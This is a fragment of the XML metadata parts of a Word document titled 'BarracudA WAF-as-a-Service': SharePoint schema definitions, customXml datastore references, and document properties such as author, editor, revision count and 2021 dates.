  <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:p="http://schemas.microsoft.com/office/2006/metadata/properties" xmlns:ns2="cc031a03-b3ee-448c-89ec-a9dba7248368" xmlns:ns3="a7fccbc4-b1de-4cd0-b913-725fd0ffe0a5" targetNamespace="http://schemas.microsoft.com/office/2006/metadata/properties" ma:root="true" ma:fieldsID="6605c44f11104ad8a55ea457b98e35d4" ns2:_="" ns3:_="">
    <xsd:import namespace="cc031a03-b3ee-448c-89ec-a9dba7248368"/>
    <xsd:import namespace="a7fccbc4-b1de-4cd0-b913-725fd0ffe0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031a03-b3ee-448c-89ec-a9dba7248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fccbc4-b1de-4cd0-b913-725fd0ffe0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A5075-8B51-4648-B94A-AD7AB81C485F}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/metadata/properties"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/infopath/2007/PartnerControls"/>
    <ds:schemaRef ds:uri="a7fccbc4-b1de-4cd0-b913-725fd0ffe0a5"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps2.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{940A9514-F76F-4911-BCAF-8AED2A84E645}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/sharepoint/v3/contenttype/forms"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps3.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{BF1196E7-7B92-4763-B7B1-97C69EFAD1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031a03-b3ee-448c-89ec-a9dba7248368"/>
    <ds:schemaRef ds:uri="a7fccbc4-b1de-4cd0-b913-725fd0ffe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E1E817-252C-4198-8BCB-9568136A2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4953</Words>
  <Characters>28233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BarracudA WAF-as-a-Service</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>33120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BarracudA WAF-as-a-Service</dc:title>
  <dc:subject/>
  <dc:creator>Wenyu Zhang</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Gabriel McHugh</cp:lastModifiedBy>
  <cp:revision>34</cp:revision>
  <cp:lastPrinted>2021-04-23T05:39:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2021-05-25T06:29:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-08-26T18:49:00Z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0x010100698DB6DB9E9A5A4CB3BEAE51B1DE4187</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="ComplianceAssetId">
    <vt:lpwstr/>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="_ExtendedDescription">
    <vt:lpwstr/>
  </property>
</Properties>
</file>